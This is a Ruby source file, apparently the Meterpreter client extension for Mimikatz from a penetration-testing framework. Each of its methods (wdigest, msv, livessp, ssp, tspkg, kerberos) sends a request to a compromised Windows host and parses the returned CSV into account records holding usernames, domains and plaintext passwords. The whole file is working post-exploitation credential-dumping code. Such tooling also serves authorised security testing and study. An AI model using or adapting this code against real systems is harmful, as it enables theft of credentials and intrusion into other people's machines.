#!/usr/bin/env ruby
# -*- coding: binary -*-

require 'rex/post/meterpreter/extensions/mimikatz/tlv'

module Rex
module Post
module Meterpreter
module Extensions
module Mimikatz

###
#
# This meterpreter extensions a privilege escalation interface that is capable
# of doing things like dumping password hashes and performing local
# exploitation.
#
###

require 'csv'

class Mimikatz < Extension

	def initialize(client)
		super(client, 'mimikatz')

		client.register_extension_aliases(
			[
				{
					'name' => 'mimikatz',
					'ext'  => self
				},
			])
	end

	def wdigest
		request = Packet.create_request('mimikatz_wdigest')
		response = client.send_request(request)
		result = Rex::Text.to_ascii(response.get_tlv_value(TLV_TYPE_MIMIKATZ_RESULT))
	
		details = CSV.parse(result)
		accounts  =  []
		details.each do |acc|
			account = { 
				:authid => acc[0],
				:package => acc[1],
				:user => acc[2],
				:domain => acc[3],
				:password => acc[4]
			}
			accounts << account	
		end
		return accounts
	end
	
	def msv
                request = Packet.create_request('mimikatz_msv1_0')
                response = client.send_request(request)
                result = Rex::Text.to_ascii(response.get_tlv_value(TLV_TYPE_MIMIKATZ_RESULT))

                details = CSV.parse(result)
                accounts  =  []
                details.each do |acc|
                        account = {
                                :authid => acc[0],
                                :package => acc[1],
                                :user => acc[2],
                                :domain => acc[3],
                                :password => acc[4]
                        }
                        accounts << account
                end
                return accounts
	end

        def livessp
                request = Packet.create_request('mimikatz_livessp')
                response = client.send_request(request)
                result = Rex::Text.to_ascii(response.get_tlv_value(TLV_TYPE_MIMIKATZ_RESULT))

                details = CSV.parse(result)
                accounts  =  []
                details.each do |acc|
                        account = {
                                :authid => acc[0],
                                :package => acc[1],
                                :user => acc[2],
                                :domain => acc[3],
                                :password => acc[4]
                        }
                        accounts << account
                end
                return accounts
        end

        def ssp
                request = Packet.create_request('mimikatz_ssp')
                response = client.send_request(request)
                result = Rex::Text.to_ascii(response.get_tlv_value(TLV_TYPE_MIMIKATZ_RESULT))

                details = CSV.parse(result)
                accounts  =  []
                details.each do |acc|
                        account = {
                                :authid => acc[0],
                                :package => acc[1],
                                :user => acc[2],
                                :domain => acc[3],
                                :password => acc[4]
                        }
                        accounts << account
                end
                return accounts
        end

        def tspkg
                request = Packet.create_request('mimikatz_tspkg')
                response = client.send_request(request)
                result = Rex::Text.to_ascii(response.get_tlv_value(TLV_TYPE_MIMIKATZ_RESULT))

                details = CSV.parse(result)
                accounts  =  []
                details.each do |acc|
                        account = {
                                :authid => acc[0],
                                :package => acc[1],
                                :user => acc[2],
                                :domain => acc[3],
                                :password => acc[4]
                        }
                        accounts << account
                end
                return accounts
        end

        def kerberos
                request = Packet.create_request('mimikatz_kerberos')
                response = client.send_request(request)
                result = Rex::Text.to_ascii(response.get_tlv_value(TLV_TYPE_MIMIKATZ_RESULT))

                details = CSV.parse(result)
                accounts  =  []
                details.each do |acc|
                        account = {
                                :authid => acc[0],
                                :package => acc[1],
                                :user => acc[2],
                                :domain => acc[3],
                                :password => acc[4]
                        }
                        accounts << account
                end
                return accounts
        end
end

end; end; end; end; end
